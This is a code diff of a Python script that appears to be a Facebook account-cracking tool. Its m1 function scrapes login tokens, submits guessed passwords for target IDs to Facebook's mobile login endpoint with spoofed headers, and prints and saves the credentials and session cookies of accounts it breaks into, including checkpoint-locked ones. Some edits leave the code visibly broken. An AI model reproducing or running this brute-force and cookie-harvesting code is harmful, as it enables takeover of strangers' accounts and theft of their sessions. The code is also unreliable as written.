@@ -482,7 +482,8 @@ def PAKISTAN():
 #━━━━[ METHOD RANDOM ]━━━━#
 def m1(ids,pwv):
     global loop,oks,cps
-    sys.stdout.write(f"\r{rad}[{green}{today}{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
+    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
     sys.stdout.flush()
     session=requests.Session()
     ua = ua_valid()
@@ -494,23 +495,22 @@ def m1(ids,pwv):
             free_fb = session.get('https://free.facebook.com').text
             info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
             update={
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Cache-Control': 'max-age=0',
-    'Referer': 'https://lm.facebook.com/',
-    'DNT': '1',
-    'Pragma': 'no-cache',
-    'TE': 'Trailers', }
-            URD='https://m.facebook.com/login/device-based/login/async/'
-            session.post(url=URD,data=info,headers=update).text
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://lm.facebook.com/',
+            'DNT': '1',
+            'Pragma': 'no-cache',
+            'TE': 'Trailers', }
+            session.post('https://m.facebook.com/login/device-based/login/async/',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -518,17 +518,19 @@ def m1(ids,pwv):
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if "Y" in ck:
                         print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{coki}');linex()
+                        print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m");linex()
                         open('/sdcard/MAHADI-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
-                        oks.append(cid)
+                        ok+=1
                         break
-                    else:
-                        print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        open('/sdcard/MAHADI-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
-                        oks.append(cid)
-                        break 
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                uid = "1000"+coki1[0:11]
+                if 'y' in cp_xdx:
+                print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
+                open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
+                cp.append(uid)
             else:
                 continue
         loop+=1
